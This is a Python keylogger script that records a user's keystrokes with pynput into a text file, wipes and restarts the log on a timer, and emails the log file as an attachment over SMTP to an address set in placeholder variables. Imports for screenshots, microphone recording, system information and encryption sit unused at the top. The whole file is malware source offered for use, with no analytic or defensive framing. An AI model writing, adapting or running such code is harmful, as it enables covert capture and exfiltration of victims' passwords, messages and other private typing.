# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import pyautogui

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Defining Variables
keys_information = "txt_filename"

time_iteration = 30
number_of_iterations_end = 3

email_address = "email"
password = "email_password"

toaddr = "email"

file_path = "path_to_txt_file"
extend = "/"

# Email Function
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg["From"] = fromaddr

    msg["To"] = toaddr

    msg["Subject"] = "Log File"

    body = "New logs are in"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename

    attachment = open(attachment, 'rb')

    p = MIMEBase("application", "text")

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header("Content-Disposition", 'attachment', filename=filename)

    msg.attach(p)

    s = smtplib.SMTP("smtp_address", 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

# Iteration Timer
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

# Recording Keys
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_files(keys)
            keys = []

# Writing Recorded Keys to a .txt File
    def write_files(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
# Defining Conditions for Implementation of New Iteration
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
















